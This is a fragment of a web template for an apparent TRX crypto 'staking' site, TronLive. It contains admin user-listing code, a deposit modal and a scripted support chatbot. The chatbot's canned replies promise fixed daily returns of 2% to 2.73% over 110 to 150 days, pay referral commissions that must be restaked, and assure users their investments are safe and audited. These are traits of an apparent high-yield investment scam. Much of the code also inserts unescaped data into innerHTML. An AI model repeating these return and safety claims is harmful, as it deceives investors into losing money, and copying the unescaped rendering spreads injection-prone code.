            <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-red-600">${user.withdrawn_amount || '0.00'} TRX</td>
            <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                <button onclick="toggleUserDetails(${user.user_id})" class="text-gray-600 hover:text-gray-900 transition-colors" title="View Details">
                    <span id="toggle-text-${user.user_id}">View Details</span>
                    <svg id="toggle-icon-${user.user_id}" class="w-4 h-4 inline ml-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path>
                    </svg>
                </button>
            </td>
        `;
        tableBody.appendChild(row);
        
        // Add the expandable details row (initially hidden)
        const detailsRow = document.createElement('tr');
        detailsRow.id = `user-details-${user.user_id}`;
        detailsRow.className = 'hidden bg-gray-50';
        detailsRow.innerHTML = `
            <td colspan="8" class="px-6 py-4">
                <div class="bg-white rounded-lg p-4 shadow-sm border">
                    <div class="flex items-center justify-between mb-4">
                        <h4 class="text-lg font-semibold text-gray-900">User Details - ${user.user_name || user.email}</h4>
                        <div class="flex space-x-4 text-sm">
                            <div class="bg-blue-100 px-3 py-1 rounded-full">
                                <span class="text-blue-800 font-medium">Total Staked: <span id="total-staked-${user.user_id}">Loading...</span> TRX</span>
                            </div>
                            <div class="bg-green-100 px-3 py-1 rounded-full">
                                <span class="text-green-800 font-medium">Total Withdrawn: <span id="total-withdrawn-${user.user_id}">Loading...</span> TRX</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                        <!-- Active Plans -->
                        <div>
                            <h5 class="text-md font-medium text-gray-900 mb-3 flex items-center">
                                <div class="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
                                Active Staking Plans
                            </h5>
                            <div id="active-plans-${user.user_id}" class="space-y-2">
                                <div class="text-center py-4 text-gray-500">Loading active plans...</div>
                            </div>
                        </div>
                        
                        <!-- Completed Plans -->
                        <div>
                            <h5 class="text-md font-medium text-gray-900 mb-3 flex items-center">
                                <div class="w-2 h-2 bg-gray-500 rounded-full mr-2"></div>
                                Completed Staking Plans
                            </h5>
                            <div id="completed-plans-${user.user_id}" class="space-y-2">
                                <div class="text-center py-4 text-gray-500">Loading completed plans...</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Recent Withdrawals -->
                    <div class="mt-6">
                        <h5 class="text-md font-medium text-gray-900 mb-3 flex items-center">
                            <div class="w-2 h-2 bg-red-500 rounded-full mr-2"></div>
                            Recent Withdrawals
                        </h5>
                        <div id="recent-withdrawals-${user.user_id}" class="space-y-2">
                            <div class="text-center py-4 text-gray-500">Loading recent withdrawals...</div>
                        </div>
                    </div>
                </div>
            </td>
        `;
        tableBody.appendChild(detailsRow);
    });
    
    // Update pagination controls
    if (pagination) {
        updatePaginationControls(pagination);
    }
}

function updatePaginationControls(pagination) {
    // Update pagination info
    const start = ((pagination.current_page - 1) * pagination.per_page) + 1;
    const end = Math.min(pagination.current_page * pagination.per_page, pagination.total);
    
    document.getElementById('vault-pagination-info').innerHTML = `
        Showing <span class="font-medium">${start}</span> to <span class="font-medium">${end}</span> of 
        <span class="font-medium">${pagination.total}</span> users
    `;
    
    // Update page numbers
    document.getElementById('vault-page-numbers').textContent = `Page ${pagination.current_page} of ${pagination.last_page}`;
    
    // Update button states
    const isFirstPage = pagination.current_page === 1;
    const isLastPage = pagination.current_page === pagination.last_page;
    
    // Previous buttons
    document.getElementById('vault-prev-mobile').disabled = isFirstPage;
    document.getElementById('vault-prev-desktop').disabled = isFirstPage;
    
    // Next buttons
    document.getElementById('vault-next-mobile').disabled = isLastPage;
    document.getElementById('vault-next-desktop').disabled = isLastPage;
}

function loadPreviousPage() {
    if (currentVaultPage > 1) {
        loadVaultData(currentVaultPage - 1);
    }
}

function loadNextPage() {
    if (vaultPagination && vaultPagination.has_more) {
        loadVaultData(currentVaultPage + 1);
    }
}

function filterUsers() {
    const searchTerm = document.getElementById('user-search').value.toLowerCase();
    
    if (!window.vaultUserData) return;
    
    const filteredUsers = window.vaultUserData.filter(user => {
        const email = (user.email || '').toLowerCase();
        const phone = (user.phone || '').toLowerCase();
        const name = (user.user_name || '').toLowerCase();
        
        return email.includes(searchTerm) || 
               phone.includes(searchTerm) || 
               name.includes(searchTerm);
    });
    
    displayUsersTable(filteredUsers);
}

async function toggleUserDetails(userId) {
    const detailsRow = document.getElementById(`user-details-${userId}`);
    const toggleText = document.getElementById(`toggle-text-${userId}`);
    const toggleIcon = document.getElementById(`toggle-icon-${userId}`);
    
    if (detailsRow.classList.contains('hidden')) {
        // Show details
        detailsRow.classList.remove('hidden');
        detailsRow.classList.add('animate-fade-in');
        toggleText.textContent = 'Hide Details';
        toggleIcon.classList.add('rotate-180');
        
        // Load user details if not already loaded
        await loadUserDetails(userId);
    } else {
        // Hide details
        detailsRow.classList.add('hidden');
        detailsRow.classList.remove('animate-fade-in');
        toggleText.textContent = 'View Details';
        toggleIcon.classList.remove('rotate-180');
    }
}

async function loadUserDetails(userId) {
    try {
        // Fetch user details from server
        const response = await fetch(`/api/system/user-details/${userId}`, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
            },
            credentials: 'same-origin' // Ensure session cookies are sent
        });
        
        const data = await response.json();
        
        if (data.success) {
            // Update totals
            document.getElementById(`total-staked-${userId}`).textContent = data.total_staked || '0.00';
            document.getElementById(`total-withdrawn-${userId}`).textContent = data.total_withdrawn || '0.00';
            
            // Display active plans
            displayStakingPlans(userId, data.active_plans || [], 'active-plans');
            
            // Display completed plans
            displayStakingPlans(userId, data.completed_plans || [], 'completed-plans');
            
            // Display recent withdrawals
            displayWithdrawals(userId, data.recent_withdrawals || []);
        } else {
            console.error('Failed to load user details:', data);
            showNotification('Failed to load user details: ' + (data.error || 'Unknown error'), 'error');
        }
    } catch (error) {
        console.error('Error loading user details:', error);
        showNotification('Error loading user details: ' + error.message, 'error');
    }
}

function displayStakingPlans(userId, plans, containerId) {
    const container = document.getElementById(`${containerId}-${userId}`);
    
    if (plans.length === 0) {
        container.innerHTML = `
            <div class="text-center py-4 text-gray-500">
                <svg class="w-8 h-8 mx-auto mb-2 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                </svg>
                No ${containerId.includes('active') ? 'active' : 'completed'} plans
            </div>
        `;
        return;
    }
    
    container.innerHTML = plans.map(plan => `
        <div class="bg-gray-50 rounded-lg p-3 border">
            <div class="flex justify-between items-start mb-2">
                <div>
                    <h6 class="font-medium text-gray-900">${plan.plan_name}</h6>
                    <p class="text-sm text-gray-600">Started: ${plan.created_at}</p>
                </div>
                <div class="text-right">
                    <div class="text-sm font-medium text-blue-600">${plan.amount} TRX</div>
                    <div class="text-xs text-gray-500">${plan.daily_rate}% daily</div>
                </div>
            </div>
            <div class="flex justify-between items-center">
                <div class="text-sm text-gray-600">
                    Progress: ${plan.progress || 0}%
                </div>
                <div class="text-sm ${containerId.includes('active') ? 'text-green-600' : 'text-gray-600'}">
                    ${containerId.includes('active') ? 'Active' : 'Completed'}
                </div>
            </div>
        </div>
    `).join('');
}

function displayWithdrawals(userId, withdrawals) {
    const container = document.getElementById(`recent-withdrawals-${userId}`);
    
    if (withdrawals.length === 0) {
        container.innerHTML = `
            <div class="text-center py-4 text-gray-500">
                <svg class="w-8 h-8 mx-auto mb-2 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                </svg>
                No recent withdrawals
            </div>
        `;
        return;
    }
    
    container.innerHTML = withdrawals.map(withdrawal => `
        <div class="bg-gray-50 rounded-lg p-3 border">
            <div class="flex justify-between items-center">
                <div>
                    <div class="font-medium text-red-600">${withdrawal.amount} TRX</div>
                    <div class="text-sm text-gray-600">${withdrawal.created_at}</div>
                </div>
                <div class="text-right">
                    <div class="text-sm ${withdrawal.status === 'completed' ? 'text-green-600' : 'text-yellow-600'}">
                        ${withdrawal.status || 'Pending'}
                    </div>
                    ${withdrawal.fee ? `<div class="text-xs text-gray-500">Fee: ${withdrawal.fee} TRX</div>` : ''}
                </div>
            </div>
        </div>
    `).join('');
}

function clearVaultData() {
    document.getElementById('vault-total-users').textContent = '***';
    document.getElementById('vault-admin-address').textContent = '***';
    document.getElementById('vault-admin-balance').textContent = '***';
    document.getElementById('vault-users-table').innerHTML = '';
    document.getElementById('user-search').value = '';
    window.vaultUserData = [];
}

function copyAddress() {
    const address = document.getElementById('balance-address').textContent;
    navigator.clipboard.writeText(address).then(() => {
        showNotification('Address copied to clipboard', 'success');
    });
}

// Add this if you don't already have a notification function
// Using global notification system from shared-functions.js

function toggleDebugInfo(stakingId) {
    const debugInfo = document.getElementById(`debug-info-${stakingId}`);
    if (debugInfo.classList.contains('hidden')) {
        // Hide all other debug infos first
        document.querySelectorAll('[id^="debug-info-"]').forEach(el => {
            el.classList.add('hidden');
        });
        // Show this debug info with animation
        debugInfo.classList.remove('hidden');
        debugInfo.classList.add('animate-fade-in');
    } else {
        debugInfo.classList.add('hidden');
        debugInfo.classList.remove('animate-fade-in');
    }
}

// Add click outside listener to close debug info
document.addEventListener('click', function(event) {
    if (!event.target.closest('button') && !event.target.closest('[id^="debug-info-"]')) {
        document.querySelectorAll('[id^="debug-info-"]').forEach(el => {
            el.classList.add('hidden');
            el.classList.remove('animate-fade-in');
        });
    }
});

// Add this JavaScript to handle the show/hide functionality
function toggleDetails(stakingId) {
    const details = document.getElementById(`staking-details-${stakingId}`);
    const showMoreText = document.getElementById(`show-more-text-${stakingId}`);
    const showMoreIcon = document.getElementById(`show-more-icon-${stakingId}`);

    if (details.classList.contains('hidden')) {
        // Show details
        details.classList.remove('hidden');
        details.classList.add('animate-fade-in');
        showMoreText.textContent = 'Show Less';
        showMoreIcon.classList.add('rotate-180');
    } else {
        // Hide details
        details.classList.add('hidden');
        details.classList.remove('animate-fade-in');
        showMoreText.textContent = 'Show Details';
        showMoreIcon.classList.remove('rotate-180');
    }
}
</script>

<!-- Add this deposit modal HTML -->
<div id="depositModal" class="fixed inset-0 z-50 hidden">
    <div class="absolute inset-0 bg-black bg-opacity-50" onclick="hideDepositModal()"></div>
    <div class="absolute inset-0 flex items-center justify-center p-4">
        <div class="bg-white rounded-2xl shadow-xl max-w-md w-full p-6 transform transition-all">
            <div class="flex justify-between items-center mb-4">
                <h3 class="text-xl font-semibold text-gray-900">Deposit TRX</h3>
                <button onclick="hideDepositModal()" class="text-gray-400 hover:text-gray-500">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                </button>
            </div>

            <div class="space-y-4">
                <!-- QR Code -->
                <div class="flex justify-center">
                    <div id="qrcode" class="bg-white p-4 rounded-lg shadow-sm"></div>
                </div>

                <!-- Wallet Address -->
                <div class="bg-gray-50 rounded-lg p-4">
                    <label class="block text-sm font-medium text-gray-700 mb-2">
                        Your TRX/TRC20 Deposit Address
                    </label>
                    <div class="flex items-center space-x-2">
                        <input type="text" value="{{ auth()->user()->wallet->address }}"
                            class="flex-1 bg-white rounded-lg px-3 py-2 text-sm font-mono text-gray-700 border border-gray-200"
                            readonly>
                        <button onclick="copyToClipboard('{{ auth()->user()->wallet->address }}', event)"
                            class="bg-blue-600 text-white p-2 rounded-lg hover:bg-blue-700">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-1M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2m0 0h2a2 2 0 012 2v3m2 4H10m0 0l3-3m-3 3l3 3"></path>
                            </svg>
                        </button>
                    </div>
                </div>

                <!-- Network Info -->
                <div class="bg-yellow-50 rounded-lg p-4">
                    <div class="flex items-start space-x-2">
                        <svg class="w-5 h-5 text-yellow-600 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                        <div class="flex-1">
                            <p class="text-sm text-yellow-800 font-medium">Important</p>
                            <ul class="mt-1 text-sm text-yellow-700 list-disc list-inside">
                                <li>Send only TRX or TRC20 tokens to this address</li>
                                <li>Minimum deposit: 1 TRX</li>
                                <li>Deposits will be credited after 1 network confirmation</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
.animate-fade-in {
    animation: fadeIn 0.3s ease-out;
}

@keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
}

/* Chat Button & Modal Styles */
.chat-float-button {
    position: fixed;
    bottom: 80px;
    right: 20px;
    z-index: 40;
    width: 50px;
    height: 50px;
    background: linear-gradient(135deg, #3B82F6, #8B5CF6);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    box-shadow: 0 4px 20px rgba(59, 130, 246, 0.4);
    cursor: pointer;
    transition: all 0.3s ease;
    animation: pulse 2s infinite;
}

.chat-float-button:hover {
    transform: scale(1.1);
    box-shadow: 0 6px 25px rgba(59, 130, 246, 0.6);
}

.chat-float-button.active {
    background: linear-gradient(135deg, #EF4444, #F59E0B);
    animation: none;
}

@keyframes pulse {
    0%, 100% { box-shadow: 0 4px 20px rgba(59, 130, 246, 0.4); }
    50% { box-shadow: 0 4px 20px rgba(59, 130, 246, 0.8), 0 0 0 10px rgba(59, 130, 246, 0.1); }
}

.chat-modal {
    position: fixed;
    bottom: 0;
    right: 0;
    width: 100vw;
    height: 100vh;
    background: white;
    z-index: 50;
    transform: translateY(100%);
    transition: transform 0.3s ease;
    display: flex;
    flex-direction: column;
}

.chat-modal.active {
    transform: translateY(0);
}

@media (min-width: 768px) {
    .chat-modal {
        bottom: 20px;
        right: 20px;
        width: 400px;
        height: 600px;
        border-radius: 16px;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
        transform: translateY(calc(100% + 20px));
    }
    
    .chat-modal.active {
        transform: translateY(0);
    }
}

.chat-messages {
    min-height: 0;
    overflow-y: auto;
    scroll-behavior: smooth;
}

.chat-messages::-webkit-scrollbar {
    width: 4px;
}

.chat-messages::-webkit-scrollbar-track {
    background: #f1f1f1;
}

.chat-messages::-webkit-scrollbar-thumb {
    background: #c1c1c1;
    border-radius: 2px;
}

.chat-messages::-webkit-scrollbar-thumb:hover {
    background: #a1a1a1;
}

.message-bubble {
    max-width: 80%;
    padding: 12px 16px;
    border-radius: 18px;
    margin-bottom: 8px;
    word-wrap: break-word;
    animation: slideIn 0.3s ease;
}

.message-bubble.user {
    background: linear-gradient(135deg, #3B82F6, #8B5CF6);
    color: white;
    margin-left: auto;
    border-bottom-right-radius: 6px;
}

.message-bubble.bot {
    background: #F3F4F6;
    color: #374151;
    margin-right: auto;
    border-bottom-left-radius: 6px;
}

@keyframes slideIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
}

.quick-questions {
    display: flex;
    gap: 8px;
    overflow-x: auto;
    padding-bottom: 8px;
    margin-bottom: 8px;
    scroll-behavior: smooth;
}

.quick-questions::-webkit-scrollbar {
    height: 4px;
}

.quick-questions::-webkit-scrollbar-track {
    background: #f1f1f1;
    border-radius: 2px;
}

.quick-questions::-webkit-scrollbar-thumb {
    background: #c1c1c1;
    border-radius: 2px;
}

.quick-questions::-webkit-scrollbar-thumb:hover {
    background: #a1a1a1;
}

.quick-question-btn {
    padding: 6px 12px;
    background: #F8FAFC;
    border: 1px solid #E2E8F0;
    border-radius: 20px;
    text-align: center;
    color: #4B5563;
    transition: all 0.2s ease;
    cursor: pointer;
    font-size: 11px;
    white-space: nowrap;
    flex-shrink: 0;
    min-width: fit-content;
}

.quick-question-btn:hover {
    background: #F1F5F9;
    border-color: #3B82F6;
    color: #3B82F6;
}

.typing-indicator {
    display: flex;
    align-items: center;
    space-x-1;
    margin-bottom: 12px;
}

.typing-dot {
    width: 8px;
    height: 8px;
    background: #9CA3AF;
    border-radius: 50%;
    animation: typing 1.4s infinite ease-in-out;
}

.typing-dot:nth-child(2) { animation-delay: 0.2s; }
.typing-dot:nth-child(3) { animation-delay: 0.4s; }

@keyframes typing {
    0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
    40% { transform: scale(1); opacity: 1; }
}
</style>

<!-- Floating Chat Button -->
<div class="chat-float-button" onclick="toggleChat()">
    <svg id="chat-icon" class="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path>
    </svg>
    <svg id="close-icon" class="w-7 h-7 text-white hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
    </svg>
</div>

<!-- Chat Modal -->
<div id="chatModal" class="chat-modal">
    <!-- Chat Header -->
    <div class="bg-gradient-to-r from-blue-600 to-purple-600 text-white p-4 flex items-center justify-between flex-shrink-0">
        <div class="flex items-center space-x-3">
            <div class="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"></path>
                </svg>
            </div>
            <div>
                <h3 class="font-semibold">TronLive Assistant</h3>
                <p class="text-sm text-blue-100">Always here to help</p>
            </div>
        </div>
        <button onclick="toggleChat()" class="text-white/80 hover:text-white">
            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
            </svg>
        </button>
    </div>

    <!-- Chat Container -->
    <div class="flex flex-col flex-1 min-h-0">
        <!-- Quick Questions -->
        <div class="p-3 bg-white border-b border-gray-100 flex-shrink-0">
            <div class="text-xs text-gray-500 mb-2">Quick Questions:</div>
            <div id="quickQuestions" class="quick-questions">
                <button class="quick-question-btn" onclick="askQuestion('How do staking plans work?')">
                    <span class="flex items-center space-x-1">
                        <span>📊</span>
                        <span>Staking Plans</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('What are the minimum requirements?')">
                    <span class="flex items-center space-x-1">
                        <span>💰</span>
                        <span>Minimums</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('How to withdraw my earnings?')">
                    <span class="flex items-center space-x-1">
                        <span>💸</span>
                        <span>Withdraw</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('Is my investment safe?')">
                    <span class="flex items-center space-x-1">
                        <span>🔒</span>
                        <span>Safety</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('How are daily rewards calculated?')">
                    <span class="flex items-center space-x-1">
                        <span>🧮</span>
                        <span>Rewards</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('What is the referral program?')">
                    <span class="flex items-center space-x-1">
                        <span>👥</span>
                        <span>Referrals</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('When will I get paid?')">
                    <span class="flex items-center space-x-1">
                        <span>⏰</span>
                        <span>Payouts</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('Can I stake multiple times?')">
                    <span class="flex items-center space-x-1">
                        <span>🔄</span>
                        <span>Multiple Stakes</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="handleQuickQuestion('My withdrawal not received')">
                    <span class="flex items-center space-x-1">
                        <span>⏳</span>
                        <span>Withdrawal Status</span>
                    </span>
                </button>
                <button class="quick-question-btn" onclick="askQuestion('How to enable 2FA')">
                    <span class="flex items-center space-x-1">
                        <span>🔐</span>
                        <span>Setup 2FA</span>
                    </span>
                </button>
            </div>
        </div>

        <!-- Chat Messages -->
        <div id="chatMessages" class="chat-messages p-4 bg-gray-50 flex-1 overflow-y-auto">
            <!-- Welcome Message -->
            <div class="message-bubble bot">
                <p class="text-sm">👋 Welcome to TronLive! I'm here to help you with your staking questions. Swipe through the quick questions above or ask me anything!</p>
            </div>
        </div>

        <!-- Chat Input -->
        <div class="p-4 bg-white border-t border-gray-200 flex-shrink-0">
            <div class="flex space-x-3">
                <input type="text" 
                       id="chatInput" 
                       placeholder="Type your question here..." 
                       class="flex-1 px-4 py-3 border border-gray-300 rounded-full focus:ring-2 focus:ring-blue-500 focus:border-transparent text-sm"
                       onkeypress="handleKeyPress(event)">
                <button onclick="sendMessage()" 
                        class="px-4 py-3 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-full hover:shadow-lg transition-all flex-shrink-0">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"></path>
                    </svg>
                </button>
            </div>
        </div>
    </div>
</div>

<script>
let isChatOpen = false;

// Enhanced responses for chatbot with greetings and basic conversation
const chatResponses = {
    // Basic greetings and conversation starters
    'hello': `
        <div class="space-y-2">
            <p>👋 <strong>Hello there!</strong></p>
            <p class="text-sm">Welcome to TronLive! I'm your personal staking assistant, here to help you understand everything about our TRX staking platform.</p>
            <p class="text-sm mt-2">💡 You can ask me about staking plans, security, withdrawals, or use the quick questions above!</p>
        </div>
    `,
    'hi': `
        <div class="space-y-2">
            <p>👋 <strong>Hi! Great to see you!</strong></p>
            <p class="text-sm">I'm the TronLive Assistant, ready to help you with all your TRX staking questions. What would you like to know?</p>
            <p class="text-sm mt-2">✨ Try asking about our staking plans or security features!</p>
        </div>
    `,
    'hey': `
        <div class="space-y-2">
            <p>👋 <strong>Hey! How's it going?</strong></p>
            <p class="text-sm">I'm here to help you make the most of TronLive's staking opportunities. Feel free to ask me anything!</p>
            <p class="text-sm mt-2">🚀 Ready to start earning with TRX staking?</p>
        </div>
    `,
    'who are you': `
        <div class="space-y-2">
            <p>🤖 <strong>I'm TronLive Assistant!</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Your Guide:</strong> I help with TRX staking questions</p>
                <p>• <strong>24/7 Available:</strong> Always here when you need help</p>
                <p>• <strong>Expert Knowledge:</strong> Know everything about our platform</p>
                <p>• <strong>Friendly Helper:</strong> Making crypto staking simple!</p>
            </div>
            <p class="text-sm mt-2">💬 Ask me anything about TronLive staking!</p>
        </div>
    `,
    'what is tronlive': `
        <div class="space-y-2">
            <p>🏢 <strong>About TronLive:</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>TRX Staking Platform:</strong> Earn daily rewards on your TRX</p>
                <p>• <strong>3 Plans Available:</strong> Premium, Advanced, and Elite</p>
                <p>• <strong>Daily Returns:</strong> 2% to 2.73% daily interest</p>
                <p>• <strong>Secure & Reliable:</strong> 2FA protection and monitoring</p>
                <p>• <strong>Referral Program:</strong> 5% commission on referrals</p>
            </div>
            <p class="text-sm mt-2">🎯 Your trusted partner for TRX staking success!</p>
        </div>
    `,
    'how does it work': `
        <div class="space-y-2">
            <p>⚙️ <strong>How TronLive Works:</strong></p>
            <div class="text-sm space-y-1">
                <p>1. <strong>Deposit TRX:</strong> Add funds to your wallet</p>
                <p>2. <strong>Choose Plan:</strong> Select Premium, Advanced, or Elite</p>
                <p>3. <strong>Stake TRX:</strong> Lock your funds in the plan</p>
                <p>4. <strong>Earn Daily:</strong> Get rewards every 24 hours</p>
                <p>5. <strong>Withdraw:</strong> Access your earnings anytime</p>
            </div>
            <p class="text-sm mt-2">💰 It's that simple to start earning!</p>
        </div>
    `,
    'thanks': `
        <div class="space-y-2">
            <p>😊 <strong>You're very welcome!</strong></p>
            <p class="text-sm">Happy to help! If you have any more questions about TronLive staking, feel free to ask anytime.</p>
            <p class="text-sm mt-2">🎉 Good luck with your TRX staking journey!</p>
        </div>
    `,
    'goodbye': `
        <div class="space-y-2">
            <p>👋 <strong>Goodbye! Take care!</strong></p>
            <p class="text-sm">Thanks for chatting with me. Remember, I'm always here whenever you need help with TronLive staking.</p>
            <p class="text-sm mt-2">💫 Happy staking and see you soon!</p>
        </div>
    `,
    'help': `
        <div class="space-y-2">
            <p>🆘 <strong>I'm here to help!</strong></p>
            <p class="text-sm">Here are some things I can assist you with:</p>
            <div class="text-sm space-y-1">
                <p>• <strong>Staking Plans:</strong> Premium, Advanced, Elite details</p>
                <p>• <strong>Security:</strong> How we protect your funds</p>
                <p>• <strong>Withdrawals:</strong> How to cash out earnings</p>
                <p>• <strong>Requirements:</strong> Minimum amounts needed</p>
                <p>• <strong>Rewards:</strong> How daily earnings work</p>
                <p>• <strong>Referrals:</strong> Earning from inviting friends</p>
            </div>
            <p class="text-sm mt-2">💡 Use the quick questions above or just ask naturally!</p>
        </div>
    `,
    'how do staking plans work': `
        <div class="space-y-2">
            <p>🎯 <strong>Staking Plans Overview:</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Premium Plan:</strong> 150-350 TRX, 2% daily, 150 days</p>
                <p>• <strong>Advanced Plan:</strong> 400-800 TRX, 2.31% daily, 130 days</p>
                <p>• <strong>Elite Plan:</strong> 850-5000 TRX, 2.73% daily, 110 days</p>
            </div>
            <p class="text-sm mt-2">💡 You earn daily rewards automatically and get your principal back after the plan duration!</p>
        </div>
    `,
    'minimum requirements': `
        <div class="space-y-2">
            <p>💰 <strong>Minimum Requirements:</strong></p>
            <div class="text-sm space-y-1">
                <p>• Minimum deposit: <strong>1 TRX</strong></p>
                <p>• Premium Plan: <strong>150 TRX</strong> minimum</p>
                <p>• Advanced Plan: <strong>400 TRX</strong> minimum</p>
                <p>• Elite Plan: <strong>850 TRX</strong> minimum</p>
                <p>• Withdrawal: <strong>10 TRX</strong> minimum</p>
            </div>
            <p class="text-sm mt-2">🔐 2FA is required for withdrawals to keep your funds secure!</p>
        </div>
    `,
    'withdraw earnings': `
        <div class="space-y-2">
            <p>💸 <strong>Withdrawal Process:</strong></p>
            <div class="text-sm space-y-1">
                <p>1. Enable <strong>2FA</strong> in your profile (required)</p>
                <p>2. Go to <strong>Withdraw</strong> section</p>
                <p>3. Enter amount (min 10 TRX)</p>
                <p>4. Confirm with 2FA code</p>
                <p>5. Processing takes 1-24 hours</p>
            </div>
            <p class="text-sm mt-2">⚡ Earnings are updated every 24 hours automatically!</p>
        </div>
    `,
    'investment safe': `
        <div class="space-y-2">
            <p>🔒 <strong>Security Measures:</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>2FA Protection:</strong> Required for withdrawals</p>
                <p>• <strong>Secure Wallets:</strong> Your funds are protected</p>
                <p>• <strong>Smart Contracts:</strong> Automated and transparent</p>
                <p>• <strong>Regular Audits:</strong> System monitoring 24/7</p>
                <p>• <strong>Rate Limiting:</strong> Protection against attacks</p>
            </div>
            <p class="text-sm mt-2">✅ We prioritize the security of your investments!</p>
        </div>
    `,
    'daily rewards calculated': `
        <div class="space-y-2">
            <p>🧮 <strong>Reward Calculation:</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Formula:</strong> (Staked Amount × Interest Rate) ÷ 100</p>
                <p>• <strong>Example:</strong> 1000 TRX × 2% = 20 TRX daily</p>
                <p>• <strong>Frequency:</strong> Every 24 hours automatically</p>
                <p>• <strong>Compounding:</strong> No, fixed daily amount</p>
            </div>
            <p class="text-sm mt-2">📈 Higher tier plans offer better daily percentages!</p>
        </div>
    `,
    'referral program': `
        <div class="space-y-2">
            <p>👥 <strong>Referral Program:</strong></p>
            <div class="text-sm space-y-1">
                <p>• <strong>Commission:</strong> 5% of referral's staking amount</p>
                <p>• <strong>How it works:</strong> Share your referral link</p>
                <p>• <strong>Earnings:</strong> Paid instantly when they stake</p>
                <p>• <strong>No Limits:</strong> Refer unlimited users</p>
                <p>• <strong>Tracking:</strong> View all referrals in dashboard</p>
            </div>
            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-2 mt-2">
                <p class="text-sm text-yellow-800"><strong>⚠️ Important:</strong> Referral earnings cannot be withdrawn directly. You must use them to stake first, then withdraw the staking profits!</p>
            </div>
            <p class="text-sm mt-2">🎁 Start earning by inviting friends today!</p>
        </div>
    `,
    'thanks bye': `
        <div class="space-y-2">
            <p>😊 <strong>Thank you and goodbye!</strong></p>
